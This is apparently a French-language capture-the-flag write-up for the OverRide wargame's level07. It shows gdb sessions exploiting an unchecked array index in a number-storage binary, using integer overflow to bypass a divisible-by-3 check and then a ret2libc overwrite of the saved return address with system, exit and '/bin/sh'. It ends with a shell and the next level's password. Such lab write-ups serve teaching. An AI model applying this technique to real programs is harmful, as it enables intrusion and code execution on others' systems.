@@ -1,0 +1,151 @@
+Nous avons un binaire qui nous affiche un prompt avec differentes commandes,
+store, read, quit.
+
+-	store recupere un nombre, stocke ce nombre dans un tableau a l'index entrer
+	par l'utilisateur..
+-	read nous permet de lire le nombre stocker a l'index indique
+-	quit, comme son nom l'indique.
+
+Un tableau de 100 entiers est utiliser et tout ses entrees sont set a 0.
+Notre programme dans un premier temps fait appel a fgets pour recuperer la
+commande entree puis appelle ensuite la fonction, concernee.
+
+<store_number>:
+
+   0x08048671 <+65>:	mov    $0xaaaaaaab,%edx
+   0x08048676 <+70>:	mov    %ecx,%eax
+   0x08048678 <+72>:	mul    %edx
+   0x0804867a <+74>:	shr    %edx
+   0x0804867c <+76>:	mov    %edx,%eax
+   0x0804867e <+78>:	add    %eax,%eax
+   0x08048680 <+80>:	add    %edx,%eax
+   0x08048682 <+82>:	mov    %ecx,%edx
+   0x08048684 <+84>:	sub    %eax,%edx
+   0x08048686 <+86>:	test   %edx,%edx
+
+Ici la partie concernant le test de la division par 3 est effectuee sur l'index
+fourni par l'utilisateur, si le nombre est divisible par 3, un message d'erreur
+apparaitra :
+
+Input command: store
+ Number: 42
+ Index: 3
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+
+Mise a part ca, aucune verification n'est effectuee sur la size des nombres ou
+index entree par l'utilisateur, il devrait donc pouvoir etre possible d'ecrire
+hors du tableau.
+
+Input command: store
+ Number: 42
+ Index: 7777777
+Segmentation fault (core dumped)
+
+=> 0x080486c5 <+149>:	shl    $0x2,%eax		<== multiplie notre index par 4
+=> 0x080486c8 <+152>:	add    0x8(%ebp),%eax	<== ebp+0x8 l'adresse de notre tableau + eax l'index
+=> 0x080486cb <+155>:	mov    -0x10(%ebp),%edx <== ebp-0x10 le nombre que nous avons entre
+=> 0x080486ce <+158>:	mov    %edx,(%eax)		<== mov notre valeur dans notre tableau
+
+Ici, il a multiplie notre index par 4 pour avoir l'offset reel en memoire car nous
+manipulons des int qui prennent en realite 4 octets.
+Nous avons aussi l'adresse de notre tableau en ebp + 0x8 qui est 0xffffd504
+
+Good, nous allons maintenant devoir trouver l'EIP, calculer l'offset et reecrire
+cet EIP.
+
+<read_number> prend en parametre le tableau, pour le verifier il nous suffit
+de break juste avant l'appel a la fonction et d'afficher la stack et nous verifierons
+par la meme occasion que l'adresse de notre tableau est bien la bonne.
+
+(gdb) x/4wx $esp
+0xffffd4e0:	0xffffd504	0x00000014	0xf7fcfac0	0xf7fdc714
+(gdb) x 0xffffd504
+0xffffd504:	0x00000000
+(gdb) x 0xffffd504 + 0x4
+0xffffd508:	0x0000002a
+
+Nous avons bien ici 0xffffd504 qui correspond au debut de notre tableau, nous pouvons
+le confirmer en affichant le contenu de l'index[1] que nous avons prealablement
+rempli avec 42.
+-
+		Input command: store
+			Number: 42
+			Index: 1
+			Completed store command successfully
+																			-
+(gdb) info frame
+Stack level 0, frame at 0xffffd6d0:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Arglist at 0xffffd6c8, args:
+ Locals at 0xffffd6c8, Previous frame's sp is 0xffffd6d0
+ Saved registers:
+  ebx at 0xffffd6bc, ebp at 0xffffd6c8, esi at 0xffffd6c0, edi at 0xffffd6c4, eip at 0xffffd6cc
+
+Nous avons maintenant l'adresse du debut du tableau 0xffffd504 et notre EIP a 0xffffd6cc.
+Nous n'avons plus qu'a soustraire les deux, puis diviser par 4 pour avoir une reprensation dans le tableau.
+
+(gdb) p/d 0xffffd6cc - 0xffffd504
+$10 = 456
+(gdb) p/d 456/4
+$11 = 114
+
+Good, l'EIP se trouve donc a l'index 114, malheureusement ce nombre est un multiple de 3
+nous ne pouvons pas le rentrer tel quel, nous allons devoir user de l'int overflow pour bypass le check.
+
+(UINT_MAX + 1)4294967296 / 4 + 114 = 1073741938
+
+On a comment acceder a l'EIP, il ne nous manque plus qu'a recuperer l'adresse
+de system, celle de /bin/sh et why not exit pour quitter proprement que nous
+stockeront respectivement a l'index 114, 115, et 116 vu que nous travaillons
+avec des entiers donc 4 octets parfait pour les adresses, que celles-ci se suivent
+et qu'elle ne sont pas des multiples de 3.
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) p/d 0xf7e6aed0
+$3 = 4159090384
+(gdb) p/d 0xf7e5eb70
+$4 = 4159040368
+(gdb) p/d 0xf7f897ec
+$5 = 4160264172
+
+Nous avons tout ce qu'il nous faut GO!
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384							<== adresse system()
+ Index: 1073741938							<== index 114
+ Completed store command successfully
+Input command: store
+ Number: 4159040368							<== adresse exit()
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172							<== adresse de "/bin/sh"
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
